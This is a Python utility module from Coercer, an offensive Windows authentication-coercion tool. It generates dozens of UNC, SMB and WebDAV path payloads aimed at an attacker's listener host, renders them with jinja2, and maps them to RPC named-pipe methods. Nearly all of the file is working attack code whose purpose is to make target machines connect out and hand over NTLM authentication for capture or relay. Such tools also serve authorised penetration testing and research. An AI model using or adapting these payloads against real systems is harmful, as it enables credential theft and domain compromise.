#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# File name          : utils.py
# Author             : Podalirius (@podalirius_)
# Date created       : 15 Sep 2022


import random
import jinja2

from coercer.core.Filter import Filter


def gen_random_name(length=8):
    alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    name = ""
    for k in range(length):
        name += random.choice(alphabet)
    return name


def generate_exploit_templates(desired_auth_type=None):
    add_uncommon_tests = False

    templates = [
        # Only ip
        ("smb", '{{listener}}\x00'),
        # SMB
        ("smb", '\\\\{{listener}}{{smb_listen_port}}\\{{rnd(8)}}\\file.txt\x00'),
        ("smb", '\\\\{{listener}}{{smb_listen_port}}\\{{rnd(8)}}\\\x00'),
        ("smb", '\\\\{{listener}}{{smb_listen_port}}\\{{rnd(8)}}\x00'),
        ("smb", '\\\\{{listener}}{{smb_listen_port}}\\\x00'),
        ("smb", '\\\\{{listener}}{{smb_listen_port}}\x00'),
        # SMB path with ?
        ("smb", '\\\\?\\{{listener}}{{smb_listen_port}}\\{{rnd(8)}}\\file.txt\x00'),
        ("smb", '\\\\?\\{{listener}}{{smb_listen_port}}\\{{rnd(8)}}\\\x00'),
        ("smb", '\\\\?\\{{listener}}{{smb_listen_port}}\\{{rnd(8)}}\x00'),
        ("smb", '\\\\?\\{{listener}}{{smb_listen_port}}\\\x00'),
        ("smb", '\\\\?\\{{listener}}{{smb_listen_port}}\x00'),
        # SMB path with .
        ("smb", '\\\\.\\{{listener}}{{smb_listen_port}}\\{{rnd(8)}}\\file.txt\x00'),
        ("smb", '\\\\.\\{{listener}}{{smb_listen_port}}\\{{rnd(8)}}\\\x00'),
        ("smb", '\\\\.\\{{listener}}{{smb_listen_port}}\\{{rnd(8)}}\x00'),
        ("smb", '\\\\.\\{{listener}}{{smb_listen_port}}\\\x00'),
        ("smb", '\\\\.\\{{listener}}{{smb_listen_port}}\x00'),
        # UNC path with ?
        ("smb", '\\\\?\\UNC\\{{listener}}{{smb_listen_port}}\\{{rnd(8)}}\\file.txt\x00'),
        ("smb", '\\\\?\\UNC\\{{listener}}{{smb_listen_port}}\\{{rnd(8)}}\\\x00'),
        ("smb", '\\\\?\\UNC\\{{listener}}{{smb_listen_port}}\\{{rnd(8)}}\x00'),
        ("smb", '\\\\?\\UNC\\{{listener}}{{smb_listen_port}}\\\x00'),
        ("smb", '\\\\?\\UNC\\{{listener}}{{smb_listen_port}}\x00'),
        # UNC path with ??
        ("smb", '\\??\\UNC\\{{listener}}{{smb_listen_port}}\\{{rnd(8)}}\\file.txt\x00'),
        ("smb", '\\??\\UNC\\{{listener}}{{smb_listen_port}}\\{{rnd(8)}}\\aa\x00'),
        ("smb", '\\??\\UNC\\{{listener}}{{smb_listen_port}}\\{{rnd(8)}}\\\x00'),
        ("smb", '\\??\\UNC\\{{listener}}{{smb_listen_port}}\\{{rnd(8)}}\x00'),
        ("smb", '\\??\\UNC\\{{listener}}{{smb_listen_port}}\\\x00'),
        ("smb", '\\??\\UNC\\{{listener}}{{smb_listen_port}}\x00'),
        # UNC path with .
        ("smb", '\\\\.\\UNC\\{{listener}}{{smb_listen_port}}\\{{rnd(8)}}\\file.txt\x00'),
        ("smb", '\\\\.\\UNC\\{{listener}}{{smb_listen_port}}\\{{rnd(8)}}\\\x00'),
        ("smb", '\\\\.\\UNC\\{{listener}}{{smb_listen_port}}\\{{rnd(8)}}\x00'),
        ("smb", '\\\\.\\UNC\\{{listener}}{{smb_listen_port}}\\\x00'),
        ("smb", '\\\\.\\UNC\\{{listener}}{{smb_listen_port}}\x00'),
        # HTTP
        ("http", '\\\\{{listener}}{{http_listen_port}}\\{{rnd(3)}}\\File.txt\x00'),
        ("http", '\\\\{{listener}}{{http_listen_port}}\\{{rnd(3)}}\\\x00'),
        ("http", '\\\\{{listener}}{{http_listen_port}}\\{{rnd(3)}}\x00'),
        ("http", '\\\\{{listener}}{{http_listen_port}}\\\x00'),
        ("http", '\\\\{{listener}}{{http_listen_port}}\x00')
    ]

    if add_uncommon_tests:
        templates += [

            # HTTP
            ("http", '\\\\{{listener}}{{http_listen_port}}\\{{rnd(3)}}\\{{rnd(8)}}\\Path\\File.txt\x00'),
            ("http", '\\\\{{listener}}{{http_listen_port}}\\{{rnd(3)}}\\{{rnd(8)}}\\Path\\\x00'),
            ("http", '\\\\{{listener}}{{http_listen_port}}\\{{rnd(3)}}\\{{rnd(8)}}\\Path\x00'),
            ("http", '\\\\{{listener}}{{http_listen_port}}\\{{rnd(3)}}\\{{rnd(8)}}\\\x00'),
            ("http", '\\\\{{listener}}{{http_listen_port}}\\{{rnd(3)}}\\{{rnd(8)}}\x00'),
            ("http", '\\\\{{listener}}{{http_listen_port}}\\{{rnd(3)}}\\\x00'),
            ("http", '\\\\{{listener}}{{http_listen_port}}\\{{rnd(3)}}\x00'),

            ("http", '//{{listener}}{{http_listen_port}}/{{rnd(3)}}/{{rnd(8)}}/Path/File.txt\x00'),
            ("http", '//{{listener}}{{http_listen_port}}/{{rnd(3)}}/{{rnd(8)}}/Path/\x00'),
            ("http", '//{{listener}}{{http_listen_port}}/{{rnd(3)}}/{{rnd(8)}}/Path\x00'),
            ("http", '//{{listener}}{{http_listen_port}}/{{rnd(3)}}/{{rnd(8)}}/\x00'),
            ("http", '//{{listener}}{{http_listen_port}}/{{rnd(3)}}/{{rnd(8)}}\x00'),
            ("http", '//{{listener}}{{http_listen_port}}/{{rnd(3)}}/\x00'),
            ("http", '//{{listener}}{{http_listen_port}}/{{rnd(3)}}\x00'),

            ("smb", '\\UNC\\{{listener}}\\{{rnd(8)}}\\file.txt\x00'),
            ("smb", '\\UNC\\{{listener}}\\{{rnd(8)}}\\\x00'),
            ("smb", '\\UNC\\{{listener}}\\{{rnd(8)}}\x00'),
            ("smb", '\\UNC\\{{listener}}\\\x00'),
            ("smb", '\\UNC\\{{listener}}\x00'),

            ("smb", 'UNC\\{{listener}}\\{{rnd(8)}}\\file.txt\x00'),
            ("smb", 'UNC\\{{listener}}\\{{rnd(8)}}\\\x00'),
            ("smb", 'UNC\\{{listener}}\\{{rnd(8)}}\x00'),
            ("smb", 'UNC\\{{listener}}\\\x00'),
            ("smb", 'UNC\\{{listener}}\x00'),

            ("smb", 'UNC:\\{{listener}}\\{{rnd(8)}}\\file.txt\x00'),
            ("smb", 'UNC:\\{{listener}}\\{{rnd(8)}}\\\x00'),
            ("smb", 'UNC:\\{{listener}}\\{{rnd(8)}}\x00'),
            ("smb", 'UNC:\\{{listener}}\\\x00'),
            ("smb", 'UNC:\\{{listener}}\x00'),

            ("http", 'http://{{listener}}/EndpointName/File.txt\x00'),
            ("http", 'http://{{listener}}/EndpointName/\x00'),
            ("http", 'http://{{listener}}/\x00'),
            ("http", 'http://{{listener}}\x00'),

            ("http", 'file://\\\\{{listener}}\\EndpointName\\Share\\Path\\File.txt\x00'),
            ("http", 'file://\\\\{{listener}}\\EndpointName\\Share\\Path\\\x00'),
            ("http", 'file://\\\\{{listener}}\\EndpointName\\Share\\Path\x00'),
            ("http", 'file://\\\\{{listener}}\\EndpointName\\Share\\\x00'),
            ("http", 'file://\\\\{{listener}}\\EndpointName\\Share\x00'),
            ("http", 'file://\\\\{{listener}}\\EndpointName\\\x00'),
            ("http", 'file://\\\\{{listener}}\\EndpointName\x00'),
        ]

    paths = []
    for auth_type, exploit_path in templates:
        if desired_auth_type is not None:
            if auth_type == desired_auth_type:
                paths.append((auth_type, exploit_path))
        else:
            paths.append((auth_type, exploit_path))
    return paths


def generate_exploit_path_from_template(template, listener, http_listen_port=80, smb_listen_port=445):
    # Declaring template functions
    rnd = gen_random_name

    if smb_listen_port is not None and smb_listen_port != 445:
        smb_listen_port = "@%d" % smb_listen_port
    else:
        smb_listen_port = ""

    if http_listen_port is not None:
        http_listen_port = "@%d" % http_listen_port
    else:
        http_listen_port = "@80"

    # Rendering template
    exploit_path = jinja2.Template(template).render(
        listener=listener,
        rnd=rnd,
        http_listen_port=http_listen_port,
        smb_listen_port=smb_listen_port
    )
    return exploit_path


def generate_filter(filter_method_name, filter_protocol_name, filter_pipe_name):
    return Filter(filter_method_name=filter_method_name, filter_protocol_name=filter_protocol_name,
                  filter_pipe_name=filter_pipe_name)


def generate_tasks(_filter, available_methods):

    tasks = {}
    for method_type in available_methods.keys():
        for category in sorted(available_methods[method_type].keys()):
            for method in sorted(available_methods[method_type][category].keys()):
                instance = available_methods[method_type][category][method]["class"]

                if _filter.method_matches_filter(instance):
                    for access_type, access_methods in instance.access.items():
                        if access_type not in tasks.keys():
                            tasks[access_type] = {}

                        # Access through SMB named pipe
                        if access_type == "ncan_np":
                            for access_method in access_methods:
                                namedpipe, uuid, version = access_method["namedpipe"], access_method["uuid"], access_method["version"]
                                if namedpipe not in tasks[access_type].keys():
                                    tasks[access_type][namedpipe] = {}

                                if uuid not in tasks[access_type][namedpipe].keys():
                                    tasks[access_type][namedpipe][uuid] = {}

                                if version not in tasks[access_type][namedpipe][uuid].keys():
                                    tasks[access_type][namedpipe][uuid][version] = []

                                if instance not in tasks[access_type][namedpipe][uuid][version]:
                                    tasks[access_type][namedpipe][uuid][version].append(instance)

    return tasks if len(tasks) > 0 else None
